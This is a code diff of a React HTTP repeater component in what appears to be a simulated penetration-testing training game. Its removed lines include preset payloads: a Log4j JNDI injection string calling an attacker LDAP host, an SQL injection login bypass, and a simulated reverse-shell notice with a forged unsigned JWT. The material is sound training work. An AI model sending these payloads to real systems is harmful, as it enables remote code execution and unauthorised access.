@@ -1,301 +1,453 @@
-import React, { useState } from 'react';
-import { Send, Globe, RefreshCw, Zap, Code } from 'lucide-react';
-import { soundManager } from '../audio/soundManager';
+import React, { useState, useEffect, useCallback, useMemo } from 'react';
+import {
+  Globe,
+  ShieldCheck,
+} from 'lucide-react';
 import { useGameStore } from '../store/gameStore';
-
-interface HttpPreset {
-  name: string;
-  method: string;
-  url: string;
-  headers: string;
-  body: string;
-}
-
-const PRESETS: HttpPreset[] = [
-  {
-    name: '1. E-Corp HR: Log4j JNDI Exploit',
-    method: 'POST',
-    url: 'http://10.10.11.45:80/api/v1/auth',
-    headers: `Host: 10.10.11.45
-User-Agent: \${jndi:ldap://10.10.14.22:1389/Exploit}
-X-Api-Version: \${jndi:ldap://10.10.14.22:1389/Exploit}
-Content-Type: application/json`,
-    body: `{\n  "employeeId": "admin",\n  "password": "guest"\n}`,
-  },
-  {
-    name: '2. IronBank: SQL Injection Auth Bypass',
-    method: 'POST',
-    url: 'http://10.10.11.82:8080/api/login',
-    headers: `Host: 10.10.11.82
-Content-Type: application/json`,
-    body: `{\n  "username": "admin' OR 1=1 -- -",\n  "password": "none"\n}`,
-  },
-  {
-    name: '3. Recon: Check Server Headers',
-    method: 'GET',
-    url: 'http://10.10.11.45:80/',
-    headers: `Host: 10.10.11.45
-User-Agent: Mozilla/5.0 (Kali Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
-Accept: text/html,application/xhtml+xml`,
-    body: '',
-  },
-];
+import { SimulationEngine } from '../simulation/simulationEngine';
+import { soundManager } from '../audio/soundManager';
+import { RequestEditor } from './http-repeater/RequestEditor';
+import { ResponseViewer } from './http-repeater/ResponseViewer';
+import { RequestHistoryDrawer } from './http-repeater/RequestHistoryDrawer';
+import { REPEATER_PRESETS } from './http-repeater/repeaterPresets';
+import {
+  HttpMethod,
+  ParamItem,
+  HeaderItem,
+  CookieItem,
+  HttpResponseState,
+  HistoryItem,
+  HttpPreset,
+} from '../types/httpRepeater';
 
 export const HttpRepeater: React.FC = () => {
-  const { updateCompromiseLevel } = useGameStore();
+  const { activeMachineId, setActiveMachine } = useGameStore();
+  const engine = SimulationEngine.getInstance();
 
-  const [method, setMethod] = useState<string>('POST');
-  const [url, setUrl] = useState<string>('http://10.10.11.45:80/api/v1/auth');
-  const [headers, setHeaders] = useState<string>(PRESETS[0].headers);
-  const [body, setBody] = useState<string>(PRESETS[0].body);
+  const machines = useMemo(() => engine.getMachines(), [engine]);
+  const activeMachine = useMemo(
+    () => engine.getMachine(activeMachineId) || machines[0],
+    [engine, activeMachineId, machines]
+  );
+
+  // Default initial configuration based on active machine
+  const getInitialUrl = (machineId: string) => {
+    switch (machineId) {
+      case 'iron-vault':
+        return 'http://10.10.11.82:3000/api/login';
+      case 'corp-dc01':
+        return 'http://10.10.11.99:80/certsrv';
+      default:
+        return 'http://10.10.11.45:80/login';
+    }
+  };
+
+  const [method, setMethod] = useState<HttpMethod>('GET');
+  const [url, setUrl] = useState<string>(() => getInitialUrl(activeMachineId));
+  const [params, setParams] = useState<ParamItem[]>([]);
+  const [headers, setHeaders] = useState<HeaderItem[]>([
+    { id: 'h1', key: 'Host', value: '10.10.11.45', enabled: true },
+    {
+      id: 'h2',
+      key: 'User-Agent',
+      value: 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0',
+      enabled: true,
+    },
+    { id: 'h3', key: 'Accept', value: '*/*', enabled: true },
+  ]);
+  const [cookies, setCookies] = useState<CookieItem[]>([]);
+  const [body, setBody] = useState<string>('');
+  const [bodyType, setBodyType] = useState<'json' | 'form' | 'raw'>('json');
 
   const [loading, setLoading] = useState<boolean>(false);
-  const [responseStatus, setResponseStatus] = useState<number | null>(null);
-  const [responseHeaders, setResponseHeaders] = useState<string>('');
-  const [responseBody, setResponseBody] = useState<string>('');
-  const [renderHtml, setRenderHtml] = useState<boolean>(false);
+  const [response, setResponse] = useState<HttpResponseState | null>(null);
 
+  // History state
+  const [history, setHistory] = useState<HistoryItem[]>([]);
+  const [selectedHistoryId, setSelectedHistoryId] = useState<string | null>(null);
+  const [isHistoryOpen, setIsHistoryOpen] = useState<boolean>(true);
+
+  // Sync target URL when active machine changes from outside
+  useEffect(() => {
+    if (activeMachine) {
+      const defaultHost = activeMachine.ip;
+      const port =
+        activeMachine.ports.find((p) => p.port === 80 || p.port === 8080 || p.port === 3000)?.port || 80;
+      const cleanPath = url.includes('/') ? url.substring(url.indexOf('/', 8)) : '/';
+      const newUrl = `http://${defaultHost}:${port}${cleanPath}`;
+      setUrl(newUrl);
+
+      setHeaders((prev) =>
+        prev.map((h) => (h.key.toLowerCase() === 'host' ? { ...h, value: `${defaultHost}:${port}` } : h))
+      );
+    }
+  }, [activeMachineId]);
+
+  // Synchronize Params with URL Query String
+  const handleParamsChange = (newParams: ParamItem[]) => {
+    setParams(newParams);
+    try {
+      const urlObj = new URL(url);
+      urlObj.search = '';
+      newParams
+        .filter((p) => p.enabled && p.key)
+        .forEach((p) => {
+          urlObj.searchParams.append(p.key, p.value);
+        });
+      setUrl(urlObj.toString());
+    } catch {
+      // Ignored if URL is temporarily malformed
+    }
+  };
+
+  // Synchronize URL change with Params
+  const handleUrlChange = (newUrl: string) => {
+    setUrl(newUrl);
+    try {
+      const urlObj = new URL(newUrl);
+      const parsedParams: ParamItem[] = [];
+      urlObj.searchParams.forEach((val, key) => {
+        parsedParams.push({
+          id: `param-${key}-${Math.random().toString(36).substr(2, 4)}`,
+          key,
+          value: val,
+          enabled: true,
+        });
+      });
+      if (parsedParams.length > 0) {
+        setParams(parsedParams);
+      }
+    } catch {
+      // Ignored while user is typing
+    }
+  };
+
+  // Synchronize Cookies with the Cookie Header
+  const handleCookiesChange = (newCookies: CookieItem[]) => {
+    setCookies(newCookies);
+    const cookieHeaderStr = newCookies
+      .filter((c) => c.enabled && c.name)
+      .map((c) => `${c.name}=${c.value}`)
+      .join('; ');
+
+    setHeaders((prev) => {
+      const existing = prev.find((h) => h.key.toLowerCase() === 'cookie');
+      if (cookieHeaderStr) {
+        if (existing) {
+          return prev.map((h) =>
+            h.key.toLowerCase() === 'cookie' ? { ...h, value: cookieHeaderStr, enabled: true } : h
+          );
+        }
+        return [
+          ...prev,
+          { id: `hdr-cookie-${Date.now()}`, key: 'Cookie', value: cookieHeaderStr, enabled: true },
+        ];
+      }
+      return prev.filter((h) => h.key.toLowerCase() !== 'cookie');
+    });
+  };
+
+  // Handle Preset Selection
   const handleSelectPreset = (preset: HttpPreset) => {
     soundManager.playKey();
+    setActiveMachine(preset.targetMachineId);
     setMethod(preset.method);
     setUrl(preset.url);
     setHeaders(preset.headers);
+    setCookies(preset.cookies);
     setBody(preset.body);
+    setBodyType(preset.bodyType);
+
+    // Sync params from URL
+    try {
+      const urlObj = new URL(preset.url);
+      const parsedParams: ParamItem[] = [];
+      urlObj.searchParams.forEach((val, key) => {
+        parsedParams.push({
+          id: `param-${key}`,
+          key,
+          value: val,
+          enabled: true,
+        });
+      });
+      setParams(parsedParams);
+    } catch {
+      setParams([]);
+    }
   };
 
-  const handleSend = () => {
+  // Send Request action
+  const handleSendRequest = useCallback(() => {
     soundManager.playKey();
     setLoading(true);
 
-    setTimeout(() => {
-      setLoading(false);
+    let targetHost = '10.10.11.45';
+    let path = '/';
 
-      // Check for Log4j exploit payload
-      if (headers.includes('jndi:ldap') || body.includes('jndi:ldap') || headers.includes('jndi:rmi')) {
-        soundManager.playConnect();
-        updateCompromiseLevel('ecorp-hr', 'USER');
-        setResponseStatus(200);
-        setResponseHeaders(`HTTP/1.1 200 OK
-Date: Thu, 29 Oct 2026 06:30:12 GMT
-Server: Apache/2.4.49 (Unix) OpenSSL/1.1.1l
-Content-Type: application/json;charset=UTF-8
-Connection: close`);
-        setResponseBody(`{
-  "status": "PROCESSING",
-  "audit": "Logged via Log4j v2.14.1 Enterprise Logger",
-  "jndi_event": "JNDI Lookup to ldap://10.10.14.22:1389/Exploit resolved",
-  "pwn_notice": "[+] Reverse TCP shell payload triggered on target container! Check your Pwnbox netcat listener on port 4444!"
-}`);
-        return;
+    try {
+      if (url.startsWith('http://') || url.startsWith('https://')) {
+        const parsed = new URL(url);
+        targetHost = parsed.hostname;
+        path = parsed.pathname + parsed.search;
+      } else {
+        const slashIdx = url.indexOf('/');
+        if (slashIdx !== -1) {
+          targetHost = url.substring(0, slashIdx);
+          path = url.substring(slashIdx);
+        } else {
+          targetHost = url;
+          path = '/';
+        }
       }
+    } catch {
+      targetHost = url.split('/')[0] || '10.10.11.45';
+      path = '/' + (url.split('/')[1] || '');
+    }
 
-      // Check for SQLi payload
-      if (body.includes("' OR 1=1") || body.includes("' OR '1'='1")) {
-        soundManager.playConnect();
-        updateCompromiseLevel('iron-vault', 'USER');
-        setResponseStatus(200);
-        setResponseHeaders(`HTTP/1.1 200 OK
-Date: Thu, 29 Oct 2026 06:30:12 GMT
-Server: Express / Node.js
-Content-Type: application/json
-Set-Cookie: auth_token=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiZmluYW5jZV9hZG1pbiJ9.; Path=/;`);
-        setResponseBody(`{
-  "success": true,
-  "message": "Authentication bypassed! Logged in as system administrator (IronBank Vault).",
-  "jwt": "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiZmluYW5jZV9hZG1pbiJ9.",
-  "flag": "ROOTRANGE{u53r_jwt_f0rg3ry_b4nk_l00t}"
-}`);
-        return;
+    // Build headers dictionary
+    const headersDict: Record<string, string> = {};
+    headers
+      .filter((h) => h.enabled && h.key)
+      .forEach((h) => {
+        headersDict[h.key] = h.value;
+      });
+
+    // Ensure Host header matches
+    if (!headersDict['Host']) {
+      headersDict['Host'] = targetHost;
+    }
+
+    // Include Content-Type if body is present
+    if (body && !headersDict['Content-Type'] && !headersDict['content-type']) {
+      headersDict['Content-Type'] =
+        bodyType === 'json'
+          ? 'application/json'
+          : bodyType === 'form'
+          ? 'application/x-www-form-urlencoded'
+          : 'text/plain';
+    }
+
+    // Execute through SimulationEngine virtual HTTP router
+    const result = engine.handleHttpRequest(targetHost, {
+      method,
+      path,
+      headers: headersDict,
+      body,
+    });
+
+    const getStatusText = (code: number) => {
+      switch (code) {
+        case 200:
+          return 'OK';
+        case 201:
+          return 'Created';
+        case 204:
+          return 'No Content';
+        case 301:
+          return 'Moved Permanently';
+        case 302:
+          return 'Found';
+        case 400:
+          return 'Bad Request';
+        case 401:
+          return 'Unauthorized';
+        case 403:
+          return 'Forbidden';
+        case 404:
+          return 'Not Found';
+        case 500:
+          return 'Internal Server Error';
+        case 502:
+          return 'Bad Gateway';
+        case 504:
+          return 'Gateway Timeout';
+        default:
+          return 'Response';
       }
+    };
 
-      // Default standard GET /
-      if (method === 'GET' && url.includes('10.10.11.45')) {
-        setResponseStatus(200);
-        setResponseHeaders(`HTTP/1.1 200 OK
-Date: Thu, 29 Oct 2026 06:30:12 GMT
-Server: Apache/2.4.49 (Unix) OpenSSL/1.1.1l
-Content-Type: text/html; charset=UTF-8
-Content-Length: 480`);
-        setResponseBody(`<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <title>E-Corp Employee Portal</title>
-</head>
-<body style="font-family: sans-serif; background: #121212; color: #fff; padding: 20px;">
-  <h2>E-Corp Internal HR Management System</h2>
-  <p>Notice: All login attempts are recorded using our centralized Log4j enterprise auditing engine.</p>
-  <hr/>
-  <form>
-    <label>Employee ID:</label><br/>
-    <input type="text" name="empId" style="padding: 5px; margin-bottom: 10px;" /><br/>
-    <label>Password:</label><br/>
-    <input type="password" name="pwd" style="padding: 5px;" /><br/>
-    <button type="submit" style="margin-top: 10px; padding: 5px 15px;">Login</button>
-  </form>
-</body>
-</html>`);
-        return;
-      }
+    const responseState: HttpResponseState = {
+      statusCode: result.statusCode,
+      statusText: getStatusText(result.statusCode),
+      headers: result.headers,
+      body: result.body,
+      durationMs: result.durationMs,
+      contentType: result.contentType,
+      contentLength: new TextEncoder().encode(result.body).length,
+      timestamp: Date.now(),
+    };
 
-      // 404 or connection failure
-      setResponseStatus(404);
-      setResponseHeaders(`HTTP/1.1 404 Not Found\nServer: Apache\nContent-Type: text/plain`);
-      setResponseBody('Error 404: The requested resource was not found on this virtual machine.');
-    }, 450);
+    // Play appropriate sound
+    if (result.statusCode === 200 || result.statusCode === 201) {
+      soundManager.playConnect();
+    } else {
+      soundManager.playKey();
+    }
+
+    setResponse(responseState);
+    setLoading(false);
+
+    // Record into History
+    const historyItem: HistoryItem = {
+      id: `hist-${Date.now()}-${Math.random().toString(36).substr(2, 4)}`,
+      timestamp: Date.now(),
+      method,
+      url,
+      host: targetHost,
+      path,
+      requestHeaders: headersDict,
+      requestBody: body,
+      response: responseState,
+    };
+
+    setHistory((prev) => [historyItem, ...prev.slice(0, 49)]);
+    setSelectedHistoryId(historyItem.id);
+  }, [engine, method, url, headers, body, bodyType]);
+
+  // Replay from history
+  const handleSelectHistoryItem = (item: HistoryItem) => {
+    soundManager.playKey();
+    setSelectedHistoryId(item.id);
+    setMethod(item.method);
+    setUrl(item.url);
+    setBody(item.requestBody);
+
+    // Convert requestHeaders back into HeaderItem array
+    const headerItems: HeaderItem[] = Object.entries(item.requestHeaders).map(([k, v], idx) => ({
+      id: `h-hist-${idx}`,
+      key: k,
+      value: v,
+      enabled: true,
+    }));
+    setHeaders(headerItems);
+
+    // Load response
+    setResponse(item.response);
+  };
+
+  // Reset to machine defaults
+  const handleReset = () => {
+    soundManager.playKey();
+    const defaultUrl = getInitialUrl(activeMachineId);
+    setUrl(defaultUrl);
+    setMethod('GET');
+    setBody('');
+    setParams([]);
+    setCookies([]);
+    setHeaders([
+      { id: 'h1', key: 'Host', value: activeMachine.ip, enabled: true },
+      {
+        id: 'h2',
+        key: 'User-Agent',
+        value: 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0',
+        enabled: true,
+      },
+      { id: 'h3', key: 'Accept', value: '*/*', enabled: true },
+    ]);
+    setResponse(null);
   };
 
   return (
-    <div className="flex flex-col h-full bg-[#070a0f] border border-slate-800 rounded-lg overflow-hidden font-mono shadow-2xl">
-      {/* Top Bar with Presets */}
-      <div className="flex items-center justify-between px-4 py-2 bg-[#0e141f] border-b border-slate-800 text-xs">
-        <div className="flex items-center space-x-2">
-          <Globe className="w-4 h-4 text-cyan-400" />
-          <span className="font-bold text-slate-200 uppercase tracking-wider">
-            // IN-BROWSER HTTP PROXY & REPEATER
+    <div className="flex flex-col h-full w-full bg-[#070a0f] text-slate-200 overflow-hidden font-mono">
+      {/* Top Banner: Range Isolation Status & Preset Quick Bar */}
+      <div className="p-3 bg-[#090d16] border-b border-slate-800 flex items-center justify-between flex-wrap gap-2 text-xs">
+        {/* Title & Security Isolation Badge */}
+        <div className="flex items-center gap-2.5">
+          <div className="flex items-center gap-1.5 font-bold text-slate-100">
+            <Globe className="w-4 h-4 text-emerald-400" />
+            <span className="tracking-wider uppercase text-[11px]">
+              // WEB SECURITY PROXY & HTTP REPEATER
+            </span>
+          </div>
+
+          <span className="hidden sm:flex items-center gap-1 px-2.5 py-0.5 rounded-full text-[9px] font-bold bg-emerald-950 text-emerald-400 border border-emerald-700/60 shadow-[0_0_10px_rgba(16,185,129,0.2)]">
+            <ShieldCheck className="w-3 h-3 text-emerald-400" />
+            <span>RANGE ISOLATION ACTIVE: 10.10.0.0/16 ONLY</span>
           </span>
         </div>
 
-        {/* Attack Presets */}
-        <div className="flex items-center space-x-2 text-[11px]">
-          <span className="text-slate-500 font-bold flex items-center gap-1">
-            <Zap className="w-3 h-3 text-amber-400" /> PRESETS:
-          </span>
-          {PRESETS.map((p, i) => (
-            <button
-              key={i}
-              onClick={() => handleSelectPreset(p)}
-              className="px-2 py-0.5 rounded bg-slate-900 border border-slate-800 hover:border-cyan-500/60 text-slate-300 hover:text-cyan-300 text-[10px]"
+        {/* Machine Target Dropdown & Presets */}
+        <div className="flex items-center gap-2 flex-wrap">
+          {/* Target Selector */}
+          <div className="flex items-center gap-1.5">
+            <span className="text-[10px] text-slate-500 uppercase">TARGET:</span>
+            <select
+              value={activeMachineId}
+              onChange={(e) => setActiveMachine(e.target.value)}
+              className="bg-slate-900 border border-slate-800 rounded px-2.5 py-1 text-slate-200 text-xs outline-none focus:border-cyan-500 cursor-pointer"
             >
-              {p.name}
-            </button>
-          ))}
+              {machines.map((m) => (
+                <option key={m.id} value={m.id}>
+                  {m.name} ({m.ip})
+                </option>
+              ))}
+            </select>
+          </div>
+
+          {/* Preset Selector */}
+          <div className="flex items-center gap-1.5">
+            <span className="text-[10px] text-slate-500 uppercase">PRESET:</span>
+            <select
+              onChange={(e) => {
+                const found = REPEATER_PRESETS.find((p) => p.id === e.target.value);
+                if (found) handleSelectPreset(found);
+              }}
+              defaultValue=""
+              className="bg-slate-900 border border-slate-800 rounded px-2.5 py-1 text-emerald-400 text-xs outline-none focus:border-emerald-500 cursor-pointer max-w-[220px] truncate"
+            >
+              <option value="" disabled>
+                -- Select Attack Preset --
+              </option>
+              {REPEATER_PRESETS.map((p) => (
+                <option key={p.id} value={p.id}>
+                  {p.name}
+                </option>
+              ))}
+            </select>
+          </div>
         </div>
       </div>
 
-      {/* URL & Method Input Bar */}
-      <div className="flex items-center px-4 py-2 bg-[#0a0f17] border-b border-slate-800/80 space-x-2">
-        <select
-          value={method}
-          onChange={(e) => setMethod(e.target.value)}
-          className="bg-slate-900 border border-slate-700 text-emerald-400 font-bold text-xs rounded px-2 py-1 outline-none focus:border-emerald-500"
-        >
-          <option value="GET">GET</option>
-          <option value="POST">POST</option>
-          <option value="PUT">PUT</option>
-          <option value="DELETE">DELETE</option>
-          <option value="HEAD">HEAD</option>
-        </select>
-
-        <input
-          type="text"
-          value={url}
-          onChange={(e) => setUrl(e.target.value)}
-          placeholder="http://10.10.11.45/api..."
-          className="flex-1 bg-slate-900 border border-slate-800 text-slate-100 text-xs rounded px-3 py-1 outline-none focus:border-cyan-500 font-mono"
-        />
-
-        <button
-          onClick={handleSend}
-          disabled={loading}
-          className="flex items-center space-x-1.5 px-4 py-1 rounded bg-emerald-600 hover:bg-emerald-500 text-black font-bold text-xs transition shadow-lg shadow-emerald-950/40 disabled:opacity-50"
-        >
-          {loading ? <RefreshCw className="w-3.5 h-3.5 animate-spin" /> : <Send className="w-3.5 h-3.5" />}
-          <span>{loading ? 'SENDING...' : 'SEND'}</span>
-        </button>
-      </div>
-
-      {/* Main Split Panels: Request vs Response */}
-      <div className="flex-1 grid grid-cols-2 divide-x divide-slate-800/80 overflow-hidden">
+      {/* Main Split Panels: Request Editor vs Response Inspector */}
+      <div className="flex-1 grid grid-cols-1 lg:grid-cols-2 divide-y lg:divide-y-0 lg:divide-x divide-slate-800 overflow-hidden">
         {/* Left: Request Editor */}
-        <div className="flex flex-col h-full bg-[#070a0f] p-3 space-y-2 overflow-hidden">
-          <div className="flex items-center justify-between text-[11px] text-slate-400 font-bold border-b border-slate-800 pb-1">
-            <span>REQUEST HEADERS</span>
-            <span className="text-[10px] text-slate-600">INSPECT & INJECT PAYLOADS</span>
-          </div>
-          <textarea
-            value={headers}
-            onChange={(e) => setHeaders(e.target.value)}
-            rows={5}
-            className="w-full bg-[#0a0f17] border border-slate-800 text-slate-300 font-mono text-xs p-2 rounded outline-none focus:border-cyan-500/60 resize-none"
-            spellCheck={false}
-          />
-
-          <div className="flex items-center justify-between text-[11px] text-slate-400 font-bold border-b border-slate-800 pb-1 pt-1">
-            <span>REQUEST BODY (PAYLOAD)</span>
-            <span className="text-[10px] text-slate-600">JSON / FORM-DATA</span>
-          </div>
-          <textarea
-            value={body}
-            onChange={(e) => setBody(e.target.value)}
-            className="flex-1 w-full bg-[#0a0f17] border border-slate-800 text-slate-300 font-mono text-xs p-2 rounded outline-none focus:border-cyan-500/60 resize-none"
-            spellCheck={false}
+        <div className="flex flex-col h-full overflow-hidden">
+          <RequestEditor
+            method={method}
+            onMethodChange={setMethod}
+            url={url}
+            onUrlChange={handleUrlChange}
+            params={params}
+            onParamsChange={handleParamsChange}
+            headers={headers}
+            onHeadersChange={setHeaders}
+            cookies={cookies}
+            onCookiesChange={handleCookiesChange}
+            body={body}
+            onBodyChange={setBody}
+            bodyType={bodyType}
+            onBodyTypeChange={setBodyType}
+            loading={loading}
+            onSend={handleSendRequest}
+            onReset={handleReset}
           />
         </div>
 
         {/* Right: Response Inspector */}
-        <div className="flex flex-col h-full bg-[#070a0f] p-3 space-y-2 overflow-hidden">
-          <div className="flex items-center justify-between text-[11px] text-slate-400 font-bold border-b border-slate-800 pb-1">
-            <div className="flex items-center space-x-2">
-              <span>RESPONSE</span>
-              {responseStatus && (
-                <span
-                  className={`px-2 py-0.5 rounded text-[10px] font-bold ${
-                    responseStatus === 200
-                      ? 'bg-emerald-950 text-emerald-400 border border-emerald-800'
-                      : 'bg-red-950 text-red-400 border border-red-800'
-                  }`}
-                >
-                  {responseStatus} OK
-                </span>
-              )}
-            </div>
-
-            {/* Toggle Raw vs Rendered HTML */}
-            <div className="flex items-center space-x-1">
-              <button
-                onClick={() => setRenderHtml(false)}
-                className={`px-2 py-0.5 rounded text-[10px] ${!renderHtml ? 'bg-slate-800 text-white' : 'text-slate-500'}`}
-              >
-                RAW
-              </button>
-              <button
-                onClick={() => setRenderHtml(true)}
-                className={`px-2 py-0.5 rounded text-[10px] ${renderHtml ? 'bg-slate-800 text-white' : 'text-slate-500'}`}
-              >
-                RENDER HTML
-              </button>
-            </div>
-          </div>
-
-          {responseHeaders && (
-            <pre className="text-[10px] text-slate-400 bg-[#090d14] p-2 rounded border border-slate-800/80 overflow-x-auto max-h-24 select-text">
-              {responseHeaders}
-            </pre>
-          )}
-
-          <div className="flex-1 bg-[#090d14] border border-slate-800 rounded p-2 overflow-y-auto select-text text-xs">
-            {responseBody ? (
-              renderHtml ? (
-                <div
-                  className="bg-white text-black p-4 rounded h-full overflow-y-auto"
-                  dangerouslySetInnerHTML={{ __html: responseBody }}
-                />
-              ) : (
-                <pre className="text-emerald-400 whitespace-pre-wrap font-mono leading-relaxed">
-                  {responseBody}
-                </pre>
-              )
-            ) : (
-              <div className="flex flex-col items-center justify-center h-full text-slate-600 text-center space-y-2">
-                <Code className="w-8 h-8 opacity-40" />
-                <span>Ready to intercept & replay HTTP requests.</span>
-                <span className="text-[10px]">Select a preset or click SEND to fire payloads.</span>
-              </div>
-            )}
-          </div>
+        <div className="flex flex-col h-full overflow-hidden">
+          <ResponseViewer response={response} loading={loading} />
         </div>
       </div>
+
+      {/* Bottom Collapsible: Request History Drawer */}
+      <RequestHistoryDrawer
+        history={history}
+        selectedHistoryId={selectedHistoryId}
+        onSelectHistoryItem={handleSelectHistoryItem}
+        onClearHistory={() => setHistory([])}
+        isOpen={isHistoryOpen}
+        onToggleOpen={() => setIsHistoryOpen((prev) => !prev)}
+      />
     </div>
   );
 };
